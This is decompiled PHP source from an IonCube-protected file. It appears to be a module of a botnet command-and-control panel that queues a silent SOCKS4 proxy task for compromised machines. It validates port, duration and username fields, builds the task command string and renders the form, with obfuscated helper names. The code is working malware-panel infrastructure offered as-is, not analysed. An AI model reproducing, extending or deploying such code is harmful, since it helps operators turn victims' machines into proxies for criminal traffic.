<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

echo "\t\t\t\t";
if (!defined("IN_TASKS_MODULE")) {
    exit("..");
}
if (!isset($_TASK_FILE_UI_ONLY)) {
    define("TASKS_SOCKS_ERROR_PORT_REQUIRED", "A valid port is required.");
    define("TASKS_SOCKS_ERROR_PORT_INVALID", "Invalid port specified. Please use a port between 1023 - 65535 or select 'Use random port ..' below.");
    define("TASKS_SOCKS_ERROR_DURATION_INVALID", "The duration you specified is invalid. Please provide a duration between 120 - 99999999 (seconds)");
    define("TASKS_SOCKS_ERROR_USERNAME_INVALID", "The username you provided is invalid. Please either leave username field blank or limit username to 1 - 32 alphanumeric characters.");
    if (!isset($_POST["cmd_socks_stop"])) {
        if (!isset($_POST["cmd_socks_port"])) {
            $_TASK_FILE_UI_FIELD_ERRORS["field_1"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_SOCKS_ERROR_PORT_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
        } else {
            if (!isset($_POST["cmd_socks_duration"])) {
                $_TASK_FILE_UI_FIELD_ERRORS["field_2"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_SOCKS_ERROR_PORT_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
            } else {
                $_TASK_COMMAND_FIELDS = array("port" => 0, "duration" => 0, "username" => "");
                $_TASK_COMMAND_FIELDS["port"] = (int) $_POST["cmd_socks_port"];
                $_TASK_COMMAND_FIELDS["duration"] = (int) $_POST["cmd_socks_duration"];
                $_TASK_COMMAND_FIELDS["username"] = !isset($_POST["cmd_socks_username"]) || strlen($_POST["cmd_socks_username"]) == 0 ? "?" : $_POST["cmd_socks_username"];
                if ((!isset($_POST["cmd_socks_random_port"]) || strlen($_POST["cmd_socks_random_port"]) == 0) && ((int) $_TASK_COMMAND_FIELDS["port"] < 1023 || 65535 < (int) $_TASK_COMMAND_FIELDS["port"])) {
                    $_TASK_FILE_UI_FIELD_ERRORS["field_1"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_SOCKS_ERROR_PORT_INVALID, true, MOD_TASKS_ALERT_WIDTH);
                } else {
                    if (99999999 < $_TASK_COMMAND_FIELDS["duration"] || 0 < $_TASK_COMMAND_FIELDS["duration"] && $_TASK_COMMAND_FIELDS["duration"] < 120) {
                        $_TASK_FILE_UI_FIELD_ERRORS["field_2"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_SOCKS_ERROR_DURATION_INVALID, true, MOD_TASKS_ALERT_WIDTH);
                    } else {
                        if ($_TASK_COMMAND_FIELDS["username"] != "?" && (32 < strlen($_TASK_COMMAND_FIELDS["username"]) || _obfuscated_0D1D251037150E3F3D0C0838215B5B1115402135392E01_($_TASK_COMMAND_FIELDS["username"]) == false)) {
                            $_TASK_FILE_UI_FIELD_ERRORS["field_3"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_SOCKS_ERROR_USERNAME_INVALID, true, MOD_TASKS_ALERT_WIDTH);
                        } else {
                            $e_cmd_switches = COMMAND_GENERAL_SWITCH_SILENT;
                            if (isset($_POST["cmd_socks_random_port"])) {
                                $e_cmd_switches .= COMMAND_SOCKS_SWITCH_RANDOM_PORT;
                            }
                            $_TASK_FILE_SQL_TASK_TYPE = TASK_TYPE_SOCKS;
                            $_TASK_COMMAND_STRING = sprintf(COMMAND_FORMAT_SOCKS, COMMAND_STRING_SOCKS, $e_cmd_switches, $_TASK_COMMAND_FIELDS["duration"], $_TASK_COMMAND_FIELDS["port"], $_TASK_COMMAND_FIELDS["username"]);
                        }
                    }
                }
            }
        }
    } else {
        $e_cmd_switches = COMMAND_GENERAL_SWITCH_SILENT . COMMAND_SOCKS_SWITCH_STOP;
        $_TASK_FILE_SQL_TASK_TYPE = TASK_TYPE_SOCKS;
        $_TASK_COMMAND_STRING = sprintf(COMMAND_FORMAT_SOCKS, COMMAND_STRING_SOCKS, $e_cmd_switches, 0, 0, "?");
    }
} else {
    $task_socks_checkbox_random_port = "";
    $task_socks_checkbox_stop = "";
    if (0 < strlen($e_task_cmd_string)) {
        $task_socks_splits = @explode(" ", $e_task_cmd_string);
        $task_socks_edit__switches = $task_socks_splits[1];
        $task_socks_edit__duration = (int) $task_socks_splits[2];
        $task_socks_edit__port = (int) $task_socks_splits[3];
        $task_socks_edit__username = $task_socks_splits[4];
        if (@strstr($task_socks_edit__switches, COMMAND_SOCKS_SWITCH_RANDOM_PORT)) {
            $task_socks_checkbox_random_port = "checked";
        }
        if (@strstr($task_socks_edit__switches, COMMAND_SOCKS_SWITCH_STOP)) {
            $task_socks_checkbox_stop = "checked";
        }
        if ($task_socks_edit__username == "?") {
            $task_socks_edit__username = "";
        }
    } else {
        $task_socks_edit__switches = "";
        $task_socks_edit__duration = (int) isset($_POST["cmd_socks_duration"]) ? $_POST["cmd_socks_duration"] : 0;
        $task_socks_edit__port = (int) isset($_POST["cmd_socks_port"]) ? $_POST["cmd_socks_port"] : 1080;
        $task_socks_edit__username = isset($_POST["cmd_socks_username"]) ? $_POST["cmd_socks_username"] : "";
        if (isset($_POST["cmd_socks_random_port"])) {
            $task_socks_checkbox_random_port = "checked";
        }
        if (isset($_POST["cmd_socks_stop"])) {
            $task_socks_checkbox_stop = "checked";
        }
    }
    echo "\t\t\t\t";
    _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("SOCKS4 Server options", 17, "top: 0px; font-size: 10px; face: font-family: Tahoma;", "left: 2px");
    echo "\t\t\t\t<br />\r\n\t\t\t\t<input type=\"hidden\" name=\"cmd_command\" value=\"socks\">\r\n\t\t\t\t<table>\r\n\t\t\t\t\t<tbody>\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\r\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -5px;\">Listen port: &nbsp;</span>\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\r\n\t\t\t\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"cmd_socks_port\" value=\"";
    echo $task_socks_edit__port;
    echo "\" style=\"position: relative; top: -1px; width: 30px; height: 10px; font-size: 10px; face: font-family: Tahoma; ";
    echo $_TASK_FILE_UI_FIELD_ERRORS["field_1"];
    echo "\">\r\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -5px;\">&nbsp;&nbsp;<i>(Enter 0 for random port)</i></span>\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\r\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -5px;\">Server duration: &nbsp;&nbsp;</span>\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\r\n\t\t\t\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"cmd_socks_duration\" value=\"";
    echo $task_socks_edit__duration;
    echo "\" style=\"position: relative; top: -1px; width: 30px; height: 10px; font-size: 10px; face: font-family: Tahoma; ";
    echo $_TASK_FILE_UI_FIELD_ERRORS["field_2"];
    echo "\">\r\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -5px;\">&nbsp;&nbsp;<i>(Seconds - Enter 0 for no time limit)</i></span>\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\r\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -5px;\">Username: &nbsp;&nbsp;&nbsp;</span>\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\r\n\t\t\t\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"cmd_socks_username\" value=\"";
    echo $task_socks_edit__username;
    echo "\" style=\"position: relative; top: -1px; width: 160px; height: 10px; font-size: 10px; face: font-family: Tahoma; ";
    echo $_TASK_FILE_UI_FIELD_ERRORS["field_3"];
    echo "\">\r\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -5px;\">&nbsp;&nbsp;<i>(Optional)</i></span>\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t</tbody>\r\n\t\t\t\t</table>\r\n\t\t\t  \r\n\t\t\t  <br />\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 210px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_socks_random_port\" value=\"yes\" style=\"position: relative; top: -1px;\" ";
    echo $task_socks_checkbox_random_port;
    echo ">\r\n                Use random port for socks daemon &nbsp;&nbsp;\r\n              </label>\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 280px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_socks_stop\" value=\"yes\" style=\"position: relative; top: -1px;\" ";
    echo $task_socks_checkbox_stop;
    echo ">\r\n                Stop existing SOCKS server &nbsp;&nbsp;<i>(All above fields are ignored)</i>\r\n              </label>\r\n\t\t\t  ";
}

?>